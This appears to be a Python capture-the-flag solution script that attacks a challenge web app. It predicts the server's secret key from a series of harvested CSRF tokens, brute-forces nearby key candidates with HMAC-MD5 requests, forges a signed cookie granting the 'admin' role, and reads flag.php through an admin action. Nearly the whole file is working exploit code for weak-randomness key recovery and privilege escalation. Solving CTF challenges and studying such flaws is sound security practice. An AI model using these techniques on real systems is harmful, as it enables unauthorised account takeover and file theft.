__author__ = 'angelwhu'

import requests
import hmac
import json
import base64

str_aaa = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

def hash_mac_md5(data, key):
    #print key
    digest_maker = hmac.new(key)
    digest_maker.update(data)
    return digest_maker.hexdigest()

def get_csrf(ss):
    start = ss.find("name=\"CSRF_TOKEN\"")
    return ss[start + 25: start + 25 + 16]

def put_l(l,csrf):
    for c in csrf:
        l.append(str_aaa.find(c))


def go():


    l= []
    headers = {"Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}

    url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
    #url = "http://angelwhu.com:8082/"
    for i in range(5):
        r = requests.get(url,headers = headers)
        csrf = get_csrf(r.text)
        #print csrf
        put_l(l,"<<<<<<")
        put_l(l,csrf)

    #print l

    r = requests.session()
    resp = r.get(url,headers = headers)
    #print resp.headers
    crsf_token = get_csrf(r.get(url,headers = headers).text)
    #print get_csrf(r.get(url).text)
    #real_key = resp.text[:6]
    secret_key = ""
    for i in range(6):
        end = len(l)

        randNUM = (l[end-3]+l[end-31]) % 62
        l.append(randNUM)
        #print randNUM
        secret_key = secret_key + str_aaa[randNUM]

    #print l

    #print real_key


    for r0  in range(3):
        for r1 in range(3):
            for r2 in range(3):
                for r3 in range(3):
                    for r4 in range(3):
                        for r5 in range(3):

                            new_secret_key = ""

                            new_secret_key += str_aaa[(str_aaa.find(secret_key[0])+r0)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[1])+r1)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[2])+r2)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[3])+r3)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[4])+r4)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[5])+r5)%62]

                            print new_secret_key

                            crsf_token = get_csrf(r.get(url,headers = headers).text)

                            key_md5 = hash_mac_md5("flag",new_secret_key)
                            print key_md5
                            post_data = {"act":"flag", "CSRF_TOKEN":crsf_token,"submit":"%E6%8F%90%E4%BA%A4", "key": key_md5}
                            resppp = r.post(url,data = post_data,headers = headers)
                            #print resppp.text
                            #print r.cookies
                            if  "Permission deny" not in resppp.text:
                                #print resppp.text
                                print r.cookies
                                print new_secret_key
                                exit()


r = requests.session()

def get_csrf_serial(url):
    csrf_serial = ""

    for i in range(3):
        resp = r.get(url)

        csrf_token = get_csrf(r.get(url).text)
        print csrf_token
        csrf_serial += csrf_token
        post_data = {"CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4"}
        r.post(url,data = post_data)

    return csrf_serial

def fuzz_secret_key(secret_key,url):
    for r0  in range(2):
        for r1 in range(2):
            for r2 in range(2):
                for r3 in range(2):
                    for r4 in range(2):
                        for r5 in range(2):

                            new_secret_key = ""

                            new_secret_key += str_aaa[(str_aaa.find(secret_key[0])-r0)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[1])-r1)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[2])-r2)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[3])-r3)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[4])-r4)%62]
                            new_secret_key += str_aaa[(str_aaa.find(secret_key[5])-r5)%62]

                            print new_secret_key
                            csrf_token = get_csrf(r.get(url).text)

                            key_md5 = hash_mac_md5("flag",new_secret_key)
                            print key_md5
                            post_data = {"act":"flag", "CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4", "key": key_md5}
                            resppp = r.post(url,data = post_data)
                            #print resppp.text
                            #print r.cookies
                            if  "Permission deny" not in resppp.text:
                                print resppp.text
                                print r.cookies
                                print new_secret_key
                                exit();



def cal_secret_key(csrf_serial):
    secret_key = ""

    for i in range(6):
        index = (str_aaa.find(csrf_serial[31 + i - 6]) -str_aaa.find(csrf_serial[28 + i - 6]) + 62) % 62

        secret_key += str_aaa[index]

    return secret_key

def construct_cookie(s_key,role):
    obj = {"role":role}
    h2 = json.dumps(obj)

    h2 = "{\"role\":\"\\u0075\\u0073\\u0065\\u0072\"}"

    print h2

    h1 = hash_mac_md5(h2,s_key)

    print base64.b64encode(h1 + h2)
    return base64.b64encode(h1 + h2)

def get_output_sanbox():

    php_session = "i3gb61avgs9a342mmp2mhiqm91";
    act = "get_defined_functions"
    act = "fg_safebox"
    #act = "phpinfo"
    new_secret_key = "y5QRaZ"

    headers = {"Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "Cookie":"PHPSESSID=" + php_session +";userinfo=" + construct_cookie(new_secret_key,"admin"),
                "X-Requested-With" : "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}

    url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
    csrf_token = get_csrf(r.get(url,headers=headers).text)
    key_md5 = hash_mac_md5(act,new_secret_key)
    print key_md5
    post_data = {"act":act, "CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4", "key": key_md5,"method":"Read","filename":"flag.php"}
    resppp = r.post(url,headers=headers, data = post_data)
    print resppp.text

def get_key():
    url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
    #url = "http://www.angelwhu.com:8082/"
    resp = r.get(url)
    real_key = resp.text[:6]
    print real_key
    secret_key = cal_secret_key(get_csrf_serial(url))

    fuzz_secret_key(secret_key,url)

if __name__ == "__main__":
    #go()
    #print hash_mac_md5("test","11GOpJ")
    get_key()
    #get_output_sanbox()
    #construct_cookie("11GOpJ",0)